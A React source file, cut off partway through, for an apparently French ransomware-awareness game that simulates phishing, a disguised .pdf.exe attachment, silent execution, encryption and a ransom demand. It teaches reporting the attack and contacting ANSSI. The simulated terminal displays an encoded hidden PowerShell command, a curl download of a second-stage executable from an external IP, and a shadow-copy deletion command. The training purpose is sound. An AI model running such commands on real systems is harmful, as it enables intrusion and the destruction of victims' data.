import React, { useState, useRef, useEffect } from 'react';
import { useLocation } from 'wouter';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronLeft, ChevronRight, Shield, BookOpen, CheckCircle, XCircle, AlertTriangle, Info, RotateCcw } from 'lucide-react';

const T = {
  bg: '#ffffff', surface: '#f7f8fa', line: '#e8eaed',
  blue: '#006a9e', red: '#ef4444', green: '#10b981', amber: '#f59e0b',
  text: '#0f172a', sub: '#64748b', muted: '#94a3b8',
  dark: '#0d1117',
  MONO: "'JetBrains Mono', monospace",
  SANS: "'Plus Jakarta Sans', sans-serif",
};

// ─── Types ─────────────────────────────────────────────────────────────────────

interface KnowledgeCard { term: string; definition: string; example?: string; law?: string; }

type StageState = 'waiting' | 'correct' | 'wrong' | 'auto';

interface Stage {
  id: string;
  chapter: string;
  title: string;
  story: string[];       // narration paragraphs
  knowledge?: KnowledgeCard[];
  screen: React.FC<{ onAction: (id: string) => void; state: StageState; actionResult?: string }>;
  instruction?: string;  // shown above the screen as call-to-action
  correctAction?: string;
  wrongActions?: string[];
  correctFeedback: string;
  wrongFeedback?: string;
  autoPlay?: boolean;    // no interaction needed, just watch
}

// ─── Knowledge Panel ───────────────────────────────────────────────────────────

function KnowledgePanel({ cards }: { cards: KnowledgeCard[] }) {
  const [open, setOpen] = useState<number | null>(null);
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
      {cards.map((card, i) => (
        <div key={i} style={{ border: `1px solid ${T.line}`, background: T.surface }}>
          <button
            onClick={() => setOpen(open === i ? null : i)}
            style={{ width: '100%', padding: '9px 14px', background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <BookOpen size={10} color={T.blue} />
              <span style={{ fontFamily: T.MONO, fontSize: 10, fontWeight: 700, color: T.blue }}>{card.term}</span>
            </div>
            <ChevronRight size={10} color={T.muted} style={{ transform: open === i ? 'rotate(90deg)' : 'none', transition: 'transform 0.15s' }} />
          </button>
          <AnimatePresence>
            {open === i && (
              <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.18 }} style={{ overflow: 'hidden' }}>
                <div style={{ padding: '0 14px 12px', borderTop: `1px solid ${T.line}` }}>
                  <p style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.65, margin: '10px 0 6px' }}>{card.definition}</p>
                  {card.example && (
                    <div style={{ padding: '8px 10px', background: '#fff', border: `1px solid ${T.line}`, borderLeft: `3px solid ${T.blue}`, marginBottom: 6 }}>
                      <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', marginBottom: 3 }}>Exemple réel</div>
                      <p style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, margin: 0, lineHeight: 1.55 }}>{card.example}</p>
                    </div>
                  )}
                  {card.law && (
                    <div style={{ padding: '8px 10px', background: '#fffbf0', border: `1px solid ${T.amber}44`, borderLeft: `3px solid ${T.amber}` }}>
                      <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.amber, textTransform: 'uppercase', marginBottom: 3 }}>⚖ Cadre légal / bonne pratique</div>
                      <p style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, margin: 0, lineHeight: 1.55 }}>{card.law}</p>
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      ))}
    </div>
  );
}

// ─── Screens ───────────────────────────────────────────────────────────────────

// SCREEN 1 — Boîte mail : l'utilisateur clique sur l'email ou le signale
const InboxScreen: React.FC<{ onAction: (id: string) => void; state: StageState; actionResult?: string }> = ({ onAction, state }) => {
  const [hoveredEmail, setHoveredEmail] = useState<number | null>(null);
  const emails = [
    { from: 'comptabilite@votre-fournisseur-rh.fr', subj: '⚠ ACTION REQUISE — Facture impayée #INV-2024-8821', time: '08:47', unread: true, suspicious: true, id: 'open_email' },
    { from: 'it@entreprise.fr', subj: 'Maintenance prévue samedi 23h–01h', time: 'Ven', unread: false, suspicious: false, id: 'safe1' },
    { from: 'newsletter@linkedin.com', subj: 'Marie Curie a visité votre profil', time: 'Ven', unread: false, suspicious: false, id: 'safe2' },
  ];
  const done = state === 'correct' || state === 'wrong';
  return (
    <div style={{ background: '#1e2433', height: '100%', display: 'flex', flexDirection: 'column', fontFamily: T.MONO, fontSize: 11 }}>
      {/* App bar */}
      <div style={{ background: '#006a9e', padding: '7px 14px', color: '#fff', fontSize: 12, fontFamily: T.SANS, fontWeight: 600 }}>
        📧 Outlook — m.dupont@entreprise.fr
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: '190px 1fr', flex: 1, overflow: 'hidden' }}>
        {/* Sidebar */}
        <div style={{ background: '#161b22', borderRight: '1px solid #30363d', padding: '8px 0' }}>
          {['📥 Boîte de réception (1)', '📤 Envoyés', '📝 Brouillons', '🗑 Corbeille'].map((f, i) => (
            <div key={i} style={{ padding: '7px 14px', color: i === 0 ? '#e6edf3' : '#6e7681', fontSize: 11, background: i === 0 ? 'rgba(0,106,158,0.25)' : 'transparent' }}>{f}</div>
          ))}
          {/* Report button */}
          {!done && (
            <div style={{ marginTop: 20, padding: '0 10px' }}>
              <motion.button
                whileHover={{ scale: 1.02 }}
                onClick={() => onAction('report')}
                style={{ width: '100%', padding: '8px 10px', background: 'rgba(16,185,129,0.15)', border: `1px solid ${T.green}44`, color: T.green, fontSize: 10, cursor: 'pointer', fontFamily: T.MONO, textAlign: 'left' }}
              >
                🛡 Signaler au SI
              </motion.button>
            </div>
          )}
        </div>
        {/* Email list */}
        <div style={{ overflowY: 'auto' }}>
          {emails.map((email, i) => (
            <motion.div
              key={i}
              whileHover={!done ? { background: 'rgba(255,255,255,0.04)' } : {}}
              onMouseEnter={() => !done && setHoveredEmail(i)}
              onMouseLeave={() => setHoveredEmail(null)}
              onClick={() => !done && onAction(email.id)}
              style={{
                padding: '12px 16px', borderBottom: '1px solid #30363d',
                background: email.suspicious ? 'rgba(239,68,68,0.06)' : 'transparent',
                cursor: done ? 'default' : 'pointer',
                transition: 'background 0.1s',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                <span style={{ color: email.suspicious ? T.red : '#8b949e', fontWeight: email.unread ? 700 : 400, fontSize: 10 }}>{email.from}</span>
                <span style={{ color: '#6e7681', fontSize: 9 }}>{email.time}</span>
              </div>
              <div style={{ color: email.unread ? '#e6edf3' : '#8b949e', fontWeight: email.unread ? 600 : 400, fontFamily: T.SANS, fontSize: 12 }}>{email.subj}</div>
              {email.suspicious && (
                <div style={{ marginTop: 5, display: 'flex', gap: 6, alignItems: 'center' }}>
                  <span style={{ fontFamily: T.MONO, fontSize: 8, color: T.red, background: 'rgba(239,68,68,0.15)', padding: '2px 6px' }}>⚠ EXPÉDITEUR EXTERNE NON VÉRIFIÉ</span>
                  {hoveredEmail === i && !done && (
                    <span style={{ fontFamily: T.MONO, fontSize: 8, color: T.amber }}>← cliquez pour ouvrir</span>
                  )}
                </div>
              )}
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  );
};

// SCREEN 2 — Pièce jointe : cliquer sur télécharger ou annuler
const AttachmentScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction, state }) => {
  const done = state === 'correct' || state === 'wrong';
  return (
    <div style={{ background: '#1e2433', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 32, fontFamily: T.MONO }}>
      <div style={{ background: '#161b22', border: `1px solid ${T.red}55`, padding: 28, maxWidth: 380, width: '100%' }}>
        <div style={{ fontFamily: T.SANS, fontWeight: 700, color: '#e6edf3', marginBottom: 18, fontSize: 14 }}>📎 Pièce jointe détectée</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14, background: '#0d1117', padding: 14, marginBottom: 14 }}>
          <span style={{ fontSize: 36 }}>📄</span>
          <div>
            <div style={{ color: '#e6edf3', fontSize: 12 }}>facture_2024_8821.pdf</div>
            <div style={{ color: T.red, fontSize: 9, marginTop: 4 }}>⚠ Extension cachée réelle : <strong>.pdf.exe</strong></div>
            <div style={{ color: '#6e7681', fontSize: 9, marginTop: 2 }}>847 KB — Signataire inconnu</div>
          </div>
        </div>
        <div style={{ background: 'rgba(245,158,11,0.1)', border: `1px solid ${T.amber}44`, padding: 10, marginBottom: 18, fontSize: 9, color: T.amber, lineHeight: 1.6 }}>
          ⚠ Windows masque les extensions par défaut.<br />
          Ce fichier est un <strong>programme exécutable (.exe)</strong> déguisé en PDF.<br />
          Domaine expéditeur : <span style={{ color: T.red }}>fournisseur-rh.fr</span> (attendu : fournisseur-rh<strong>.com</strong>)
        </div>
        {!done && (
          <div style={{ display: 'flex', gap: 10 }}>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('download')}
              style={{ flex: 1, padding: '11px 0', background: T.red, color: '#fff', border: 'none', cursor: 'pointer', fontFamily: T.MONO, fontSize: 11, fontWeight: 600 }}>
              💾 Télécharger et ouvrir
            </motion.button>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('cancel')}
              style={{ flex: 1, padding: '11px 0', background: 'rgba(16,185,129,0.15)', color: T.green, border: `1px solid ${T.green}55`, cursor: 'pointer', fontFamily: T.MONO, fontSize: 11 }}>
              ✕ Annuler & signaler
            </motion.button>
          </div>
        )}
        {done && state === 'wrong' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ color: T.red, fontSize: 10, textAlign: 'center', padding: 10, background: 'rgba(239,68,68,0.1)', border: `1px solid ${T.red}44` }}>
            ⚠ Exécution en cours... Le malware est actif.
          </motion.div>
        )}
      </div>
    </div>
  );
};

// SCREEN 3 — Terminal automatique (l'utilisateur regarde)
const TerminalAutoScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction }) => {
  const lines = [
    { text: 'C:\\Users\\dupont> [Processus silencieux démarré]', color: '#8b949e', delay: 200 },
    { text: '> powershell -WindowStyle Hidden -enc JABzAD0ATgBlAHcA...', color: T.amber, delay: 900 },
    { text: '> [✓] Windows Defender désactivé (registre modifié)', color: T.red, delay: 2000 },
    { text: '> curl -s http://185.220.101.47/stage2.exe -o %TEMP%\\svchost32.exe', color: T.amber, delay: 3000 },
    { text: '> [✓] Connexion C2 établie : 185.220.101.47:443 (TLS/Tor)', color: T.red, delay: 4200 },
    { text: '> [✓] Payload ransomware v3.1 chargé en mémoire', color: T.red, delay: 5300 },
    { text: '> Scan réseau local 192.168.1.0/24...', color: T.amber, delay: 6200 },
    { text: '> [✓] Partages : \\\\SRV-RH\\Docs  \\\\SRV-Compta\\2024', color: T.red, delay: 7200 },
    { text: '> find C:\\Users -name "*.docx" "*.xlsx" "*.pdf" "*.pst" "*.jpg"', color: T.amber, delay: 8200 },
    { text: '> [✓] 4 291 fichiers identifiés. Lancement chiffrement AES-256...', color: T.red, delay: 9300 },
  ];
  const [visible, setVisible] = useState(0);
  const [ready, setReady] = useState(false);
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const timers: ReturnType<typeof setTimeout>[] = [];
    lines.forEach((l, i) => {
      timers.push(setTimeout(() => setVisible(i + 1), l.delay));
    });
    timers.push(setTimeout(() => setReady(true), 10500));
    return () => timers.forEach(clearTimeout);
  }, []);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [visible]);

  return (
    <div style={{ background: T.dark, height: '100%', padding: 20, fontFamily: T.MONO, fontSize: 12, display: 'flex', flexDirection: 'column' }}>
      <div style={{ color: '#6e7681', marginBottom: 12, fontSize: 10 }}>● ● ●  Terminal — activité en arrière-plan (invisible pour la victime)</div>
      <div style={{ flex: 1, overflowY: 'auto' }}>
        {lines.slice(0, visible).map((line, i) => (
          <motion.div key={i} initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }} style={{ color: line.color, marginBottom: 7, lineHeight: 1.5 }}>
            {line.text}
          </motion.div>
        ))}
        {visible > 0 && visible < lines.length && (
          <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.7 }} style={{ color: T.green }}>█</motion.span>
        )}
        <div ref={endRef} />
      </div>
      {ready && (
        <motion.button
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          onClick={() => onAction('continue')}
          style={{ marginTop: 16, padding: '10px 0', background: 'rgba(239,68,68,0.15)', border: `1px solid ${T.red}55`, color: T.red, fontFamily: T.MONO, fontSize: 11, cursor: 'pointer', textAlign: 'center' }}
        >
          ▶ Voir la suite de l'attaque →
        </motion.button>
      )}
    </div>
  );
};

// SCREEN 4 — Chiffrement live
const EncryptingScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction }) => {
  const [count, setCount] = useState(0);
  const [done, setDone] = useState(false);
  const exts = ['DOCX', 'XLSX', 'PDF', 'JPG', 'PPTX', 'PST', 'CSV', 'SQL', 'BAK', 'PNG', 'MP4', 'RAW'];

  useEffect(() => {
    const i = setInterval(() => setCount(c => {
      if (c >= 4291) { clearInterval(i); setDone(true); return 4291; }
      return c + Math.floor(Math.random() * 22) + 5;
    }), 100);
    return () => clearInterval(i);
  }, []);

  return (
    <div style={{ background: '#0a0000', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 24, fontFamily: T.MONO, textAlign: 'center' }}>
      <motion.div animate={{ opacity: [1, 0.3, 1] }} transition={{ repeat: done ? 0 : Infinity, duration: 0.8 }}
        style={{ color: T.red, fontSize: 15, fontWeight: 700, marginBottom: 6 }}>
        {done ? '🔒 CHIFFREMENT TERMINÉ' : '🔐 CHIFFREMENT EN COURS...'}
      </motion.div>
      <div style={{ color: '#6e7681', fontSize: 9, marginBottom: 20 }}>AES-256-CBC | Clé RSA-4096 envoyée au serveur C2</div>
      <div style={{ color: T.red, fontSize: 36, fontWeight: 800, marginBottom: 4 }}>{count.toLocaleString('fr-FR')}</div>
      <div style={{ color: '#6e7681', fontSize: 10, marginBottom: 20 }}>/ 4 291 fichiers chiffrés</div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 4, width: '100%', maxWidth: 340, marginBottom: 20 }}>
        {exts.map((ext, i) => {
          const threshold = (i / exts.length) * 4291;
          const active = count > threshold;
          return (
            <motion.div key={ext} animate={{ background: active ? '#330000' : '#111', borderColor: active ? T.red : '#222' }}
              style={{ padding: '4px 0', textAlign: 'center', fontSize: 8, color: active ? T.red : '#333', border: '1px solid #222', transition: 'all 0.3s' }}>
              .{ext}
            </motion.div>
          );
        })}
      </div>
      {done && (
        <motion.button
          initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
          onClick={() => onAction('continue')}
          style={{ padding: '10px 24px', background: 'rgba(239,68,68,0.15)', border: `1px solid ${T.red}55`, color: T.red, fontFamily: T.MONO, fontSize: 11, cursor: 'pointer' }}>
          ▶ Voir la demande de rançon →
        </motion.button>
      )}
    </div>
  );
};

// SCREEN 5 — Rançon : payer ou contacter l'ANSSI
const RansomScreen: React.FC<{ onAction: (id: string) => void; state: StageState }> = ({ onAction, state }) => {
  const [h, setH] = useState(71); const [m, setM] = useState(59); const [s, setS] = useState(47);
  const done = state === 'correct' || state === 'wrong';
  useEffect(() => {
    const i = setInterval(() => setSec(), 1000);
    return () => clearInterval(i);
  }, []);
  const setSec = () => setS(prev => { if (prev > 0) return prev - 1; setM(prev2 => { if (prev2 > 0) return prev2 - 1; setH(prev3 => prev3 > 0 ? prev3 - 1 : 0); return 59; }); return 59; });
  const pad = (n: number) => String(n).padStart(2, '0');
  return (
    <div style={{ background: '#000', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}>
      <div style={{ border: `2px solid ${T.red}`, padding: 28, maxWidth: 360, width: '100%', textAlign: 'center', fontFamily: T.MONO }}>
        <div style={{ fontSize: 40, marginBottom: 10 }}>🔒</div>
        <div style={{ color: T.red, fontSize: 14, fontWeight: 700, marginBottom: 10 }}>VOS FICHIERS ONT ÉTÉ CHIFFRÉS</div>
        <div style={{ color: '#c9d1d9', fontSize: 10, lineHeight: 1.8, marginBottom: 16 }}>
          4 291 fichiers sont inaccessibles.<br />
          Envoyez <span style={{ color: T.amber, fontWeight: 700, fontSize: 13 }}>0.8 BTC ≈ 32 400 €</span><br />
          à cette adresse Bitcoin :
        </div>
        <div style={{ background: '#1a0000', padding: 10, marginBottom: 16, wordBreak: 'break-all', color: T.amber, fontSize: 9 }}>
          3Fk9mRxT7vQpNs2wJ8cLdHyBg5AeUiMo1Pr
        </div>
        <div style={{ color: '#6e7681', fontSize: 9, marginBottom: 6 }}>Destruction de la clé dans :</div>
        <div style={{ color: T.red, fontSize: 26, fontWeight: 800, marginBottom: 20 }}>
          {pad(h)}:{pad(m)}:{pad(s)}
        </div>
        {!done && (
          <div style={{ display: 'flex', gap: 10 }}>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('pay')}
              style={{ flex: 1, padding: '11px 0', background: 'rgba(239,68,68,0.15)', border: `1px solid ${T.red}55`, color: T.red, cursor: 'pointer', fontFamily: T.MONO, fontSize: 10, fontWeight: 600 }}>
              💸 Payer la rançon
            </motion.button>
            <motion.button whileHover={{ scale: 1.02 }} onClick={() => onAction('anssi')}
              style={{ flex: 1, padding: '11px 0', background: 'rgba(16,185,129,0.15)', border: `1px solid ${T.green}55`, color: T.green, cursor: 'pointer', fontFamily: T.MONO, fontSize: 10, fontWeight: 600 }}>
              🛡 Contacter l'ANSSI
            </motion.button>
          </div>
        )}
        {done && (
          <div style={{ color: state === 'correct' ? T.green : T.red, fontSize: 10, padding: 10, background: state === 'correct' ? 'rgba(16,185,129,0.1)' : 'rgba(239,68,68,0.1)', border: `1px solid ${state === 'correct' ? T.green : T.red}44` }}>
            {state === 'correct' ? '✓ ANSSI contactée — analyse en cours' : '⚠ Paiement envoyé — résultat incertain'}
          </div>
        )}
      </div>
    </div>
  );
};

// SCREEN 6 — Bilan final
const BilanScreen: React.FC<{ onAction: (id: string) => void; state: StageState; good: boolean }> = ({ good }) => (
  <div style={{ background: good ? '#001a0f' : '#100000', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 28, fontFamily: T.MONO, textAlign: 'center' }}>
    <div style={{ fontSize: 48, marginBottom: 12 }}>{good ? '🛡' : '💀'}</div>
    <div style={{ color: good ? T.green : T.red, fontSize: 16, fontWeight: 700, marginBottom: 10 }}>
      {good ? 'ATTAQUE BLOQUÉE' : 'SYSTÈME COMPROMIS'}
    </div>
    <div style={{ color: '#6e7681', fontSize: 10, maxWidth: 280, lineHeight: 1.8, marginBottom: 24 }}>
      {good
        ? "Grâce à vos bons réflexes, l'ANSSI a identifié la souche. Déchiffrement gratuit proposé. Vos données sont récupérées. Plainte déposée sous 72h — assurance activée."
        : "Rançon payée. 65% de chance de récupérer les données (Sophos 2023). Vous êtes désormais sur la liste des 'payeurs' — cible prioritaire pour une prochaine attaque."}
    </div>
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, width: '100%', maxWidth: 300 }}>
      {[
        ['Données récupérées', good ? '100%' : '62%'],
        ['Coût total incident', good ? '~8 000 €' : '~89 000 €'],
        ['Durée d\'arrêt', good ? '4 heures' : '11 jours'],
        ['Conformité RGPD', good ? '✓ Notifié' : '✗ Hors délai'],
      ].map(([label, val], i) => (
        <div key={i} style={{ background: good ? 'rgba(16,185,129,0.08)' : 'rgba(239,68,68,0.08)', border: `1px solid ${good ? T.green : T.red}22`, padding: 12 }}>
          <div style={{ color: '#6e7681', fontSize: 8, marginBottom: 4 }}>{label}</div>
          <div style={{ color: good ? T.green : T.red, fontSize: 13, fontWeight: 700 }}>{val}</div>
        </div>
      ))}
    </div>
  </div>
);

// ─── Story Data ────────────────────────────────────────────────────────────────

function buildStages(choices: Record<string, string>): Stage[] {
  const goodChoices = choices['inbox'] === 'report' && choices['attachment'] === 'cancel' && choices['ransom'] === 'anssi';

  return [
    {
      id: 'inbox',
      chapter: 'ACTE 1 / 6',
      title: 'Un email arrive dans votre boîte',
      instruction: '→ Interagissez avec la boîte mail : ouvrez l\'email ou signalez-le au service informatique.',
      story: [
        'Lundi matin, 08h47. Vous ouvrez votre messagerie. Un email affiche une urgence : **"Facture impayée — votre compte sera suspendu dans 24h"**.',
        'L\'expéditeur semble être un fournisseur habituel. Le ton est professionnel, urgent. C\'est exactement ce que les attaquants veulent : **vous faire agir vite, sans réfléchir**.',
        'Cette technique s\'appelle le **phishing** (hameçonnage). En 2023, c\'est le vecteur d\'entrée numéro 1 des cyberattaques en France (83% des incidents — ANSSI).',
      ],
      knowledge: [
        { term: 'Phishing', definition: 'Technique d\'ingénierie sociale par email visant à tromper la victime pour lui faire effectuer une action nuisible (cliquer, télécharger, payer). L\'urgence créée est intentionnelle.', example: 'En 2020, une attaque de phishing ciblée (spear-phishing) a permis de compromettre le compte Twitter de Barack Obama, Elon Musk et Apple.', law: 'Article 323-1 du Code pénal : usurpation d\'identité numérique et fraude informatique. Jusqu\'à 5 ans de prison.' },
        { term: 'Ingénierie sociale', definition: 'Manipulation psychologique exploitant les biais cognitifs humains (autorité, urgence, confiance, peur). L\'humain est statistiquement plus vulnérable que les systèmes informatiques.', example: '"Je n\'ai jamais eu besoin de hacker un ordinateur. Je hackais les gens." — Kevin Mitnick, hacker légendaire des années 90.' },
      ],
      screen: InboxScreen,
      correctAction: 'report',
      wrongActions: ['open_email'],
      correctFeedback: 'Excellent réflexe. Signaler sans interagir est la règle d\'or. Le SI peut analyser les en-têtes de l\'email (IP source, chemin SMTP), bloquer l\'expéditeur au niveau serveur et alerter toute l\'organisation. Vous venez d\'éviter l\'intrusion dès le départ.',
      wrongFeedback: 'Vous avez ouvert l\'email. Un pixel de tracking invisible a confirmé à l\'attaquant que votre adresse est active et que vous avez réagi à son appât. La suite de l\'attaque peut maintenant commencer.',
    },
    {
      id: 'attachment',
      chapter: 'ACTE 2 / 6',
      title: 'La pièce jointe piégée',
      instruction: '→ Téléchargez la facture ou annulez et signalez le fichier suspect.',
      story: [
        'L\'email contient une pièce jointe : **"facture_2024_8821.pdf"**. Mais regardez attentivement l\'extension réelle affichée dans la fenêtre de téléchargement...',
        'Le fichier s\'appelle en réalité **"facture_2024_8821.pdf.exe"**. Windows masque les extensions connues par défaut, ce qui dissimule le danger. C\'est une technique appelée **double extension**.',
        'L\'email provient du domaine **"fournisseur-rh.fr"** alors que le vrai domaine est **"fournisseur-rh.com"** — une seule lettre de différence, invisible à la lecture rapide. C\'est du **typosquatting**.',
      ],
      knowledge: [
        { term: 'Typosquatting', definition: 'Enregistrement de noms de domaine quasi-identiques à des domaines légitimes (une lettre changée, ajout d\'un tiret, extension différente) pour tromper les victimes.', example: 'paypa1.com (le "l" remplacé par "1") au lieu de paypal.com. Impossible à détecter à lecture rapide.', law: 'Bonne pratique : avant tout paiement ou connexion, vérifiez toujours l\'URL complète dans la barre d\'adresse.' },
        { term: 'Double extension & masquage', definition: 'Windows cache par défaut les extensions de fichiers connues. Un attaquant nomme son malware "facture.pdf.exe" — Windows n\'affiche que "facture.pdf" avec l\'icône PDF.', law: 'Solution : activer l\'affichage des extensions dans l\'Explorateur Windows → Affichage → "Extensions de noms de fichiers". Recommandation ANSSI.' },
      ],
      screen: AttachmentScreen,
      correctAction: 'cancel',
      wrongActions: ['download'],
      correctFeedback: 'Vous avez évité le piège. Vérifier par un autre canal (appeler le fournisseur) aurait confirmé qu\'aucune facture n\'a été envoyée ce jour-là. Le fichier est maintenant bloqué et analysé par votre antivirus en sandbox.',
      wrongFeedback: 'Le fichier .exe s\'exécute silencieusement. En moins de 3 secondes, il désactive l\'antivirus et établit une connexion vers un serveur en Russie. L\'attaque est maintenant en cours — regardez ce qui se passe.',
    },
    {
      id: 'execution',
      chapter: 'ACTE 3 / 6',
      title: 'L\'exécution silencieuse',
      instruction: '→ Observez l\'attaque se dérouler en arrière-plan. L\'utilisateur ne voit rien à l\'écran.',
      story: [
        'Le malware s\'exécute. **Rien n\'apparaît à l\'écran** — c\'est intentionnel. En coulisse, il travaille depuis 47 secondes.',
        'Il commence par **désactiver Windows Defender** via une modification du registre, puis contacte un **serveur C2** (Command & Control) hébergé via le réseau Tor. Il télécharge ensuite la charge utile principale : le ransomware.',
        'Technique utilisée : **Living off the Land (LotL)** — exploitation d\'outils Windows légitimes (PowerShell, certutil, wmic) pour éviter la détection. Même un bon antivirus peut rater cette attaque.',
        'C\'est pourquoi la **prévention** (ne pas cliquer) est infiniment plus efficace que la **détection** après coup.',
      ],
      knowledge: [
        { term: 'C2 — Command & Control', definition: 'Serveur distant contrôlé par l\'attaquant. Il reçoit les données volées et envoie des instructions au malware. Souvent hébergé via Tor ou des pays non-coopératifs pour l\'impunité.', example: 'WannaCry (2017) a infecté 200 000 machines dans 150 pays via un C2 Tor. Dommages : 4 à 8 milliards de dollars.' },
        { term: 'Living off the Land (LotL)', definition: 'Technique consistant à n\'utiliser que des outils légitimes du système cible (PowerShell, WMI, certutil) pour éviter les détections antivirus basées sur les signatures.', law: 'NIS2 (2024) impose aux entités essentielles un SIEM (Security Information and Event Management) pour détecter ce type d\'activité anormale.' },
      ],
      screen: TerminalAutoScreen,
      correctAction: 'continue',
      correctFeedback: 'L\'attaque progresse. Le malware a maintenant cartographié votre réseau et identifié tous vos fichiers. La prochaine étape : le chiffrement.',
    },
    {
      id: 'encrypting',
      chapter: 'ACTE 4 / 6',
      title: 'Le chiffrement — vos fichiers disparaissent',
      instruction: '→ Regardez vos fichiers disparaître en temps réel. Aucune action possible à ce stade.',
      story: [
        'Le ransomware utilise **AES-256** pour chiffrer les fichiers et **RSA-4096** pour protéger la clé. Sans la clé privée de l\'attaquant, il est **mathématiquement impossible** de déchiffrer.',
        'En 8 minutes : 4 291 fichiers chiffrés. Documents RH, contrats clients, base comptable, photos. Les **partages réseau** accessibles depuis votre poste sont aussi touchés — toute l\'entreprise est impactée.',
        'Le malware efface également les **shadow copies** (sauvegardes automatiques Windows) pour bloquer toute restauration facile.',
        '**Règle d\'or des sauvegardes : 3-2-1** — 3 copies, sur 2 supports différents, dont 1 hors-ligne déconnectée du réseau. C\'est la seule protection efficace contre un ransomware.',
      ],
      knowledge: [
        { term: 'AES-256 + RSA-4096', definition: 'Chiffrement hybride : AES-256 (symétrique, rapide) chiffre les fichiers. RSA-4096 (asymétrique) chiffre la clé AES. Seul l\'attaquant a la clé privée RSA.', example: 'Casser AES-256 par force brute prendrait plus longtemps que l\'âge de l\'univers avec la technologie actuelle.' },
        { term: 'Shadow Copy (VSS)', definition: 'Fonctionnalité Windows créant des instantanés automatiques du système de fichiers. Les ransomwares modernes les suppriment via "vssadmin delete shadows /all /quiet".', law: 'Règle 3-2-1 : 3 copies · 2 supports différents · 1 hors-ligne. La sauvegarde hors-ligne est la seule protection garantie contre un ransomware.' },
        { term: 'WannaCry (2017)', definition: 'Ransomware ayant causé 4–8 milliards € de dommages. A touché NHS (UK), Renault, Airbus, FedEx. Exploitait EternalBlue, une faille NSA volée par Shadow Brokers.', law: 'Attribution officielle : Corée du Nord, groupe Lazarus (GCHQ + DOJ américain, 2018).' },
      ],
      screen: EncryptingScreen,
      correctAction: 'continue',
      correctFeedback: 'Le chiffrement est terminé. L\'attaquant contrôle maintenant votre réseau. La demande de rançon va apparaître sur tous les écrans de l\'entreprise.',
    },
    {
      id: 'ransom',
      chapter: 'ACTE 5 / 6',
      title: 'La demande de rançon',
      instruction: '→ Vous avez 72h. Que faites-vous ?',
      story: [
        'Un message s\'affiche sur **tous les écrans** de l\'entreprise simultanément. Demande : **0.8 Bitcoin (≈ 32 400€)** dans les 72h. Passé ce délai, le montant double. Après 7 jours, la clé est détruite.',
        '**Obligation légale (LOPMI 2023)** : vous devez déposer plainte dans les **72h** pour être remboursé par votre cyber-assurance. L\'ANSSI recommande de **ne jamais payer** sans consulter les autorités.',
        '**Paradoxe du paiement** : seulement 65% des victimes récupèrent leurs données après paiement (Sophos 2023). Et vous financez potentiellement des organisations sous sanctions internationales — risque pénal pour vous (violations OFAC).',
        'L\'ANSSI propose parfois des outils de **déchiffrement gratuits** pour les souches connues. Le projet européen **No More Ransom** (Europol) en recense des centaines.',
      ],
      knowledge: [
        { term: 'LOPMI 2023', definition: 'Loi d\'Orientation et de Programmation du Ministère de l\'Intérieur : les assureurs ne peuvent rembourser une rançon que si la victime a déposé plainte dans les 72h.', law: 'Article L12-10-1 du Code des assurances. Objectif : décourager les paiements et forcer la coopération avec la justice.' },
        { term: 'ANSSI', definition: 'Agence Nationale de la Sécurité des Systèmes d\'Information. Autorité nationale, sous tutelle du Premier Ministre. Publie des guides, certifie les produits, gère les incidents critiques.', law: 'En cas d\'incident : cybermalveillance.gouv.fr ou cert-fr.eu. Hotline pour TPE/PME : 3018. Déclaration RGPD : cnil.fr sous 72h si données personnelles touchées.' },
        { term: 'RGPD Article 33', definition: 'En cas de violation de données à caractère personnel, le responsable de traitement doit notifier la CNIL dans les 72h. Les ransomwares constituent presque toujours une violation.', law: 'Amende jusqu\'à 4% du chiffre d\'affaires mondial ou 20 M€. En France : cnil.fr → Espace professionnels → Notifications de violations.' },
      ],
      screen: RansomScreen,
      correctAction: 'anssi',
      wrongActions: ['pay'],
      correctFeedback: 'Bonne décision. L\'ANSSI analyse la souche et propose un outil de déchiffrement gratuit (la clé était connue). Plainte déposée sous 72h — l\'assurance peut intervenir. Données récupérées à 100%. Coût total : ~8 000€ (frais d\'intervention). Durée d\'arrêt : 4 heures.',
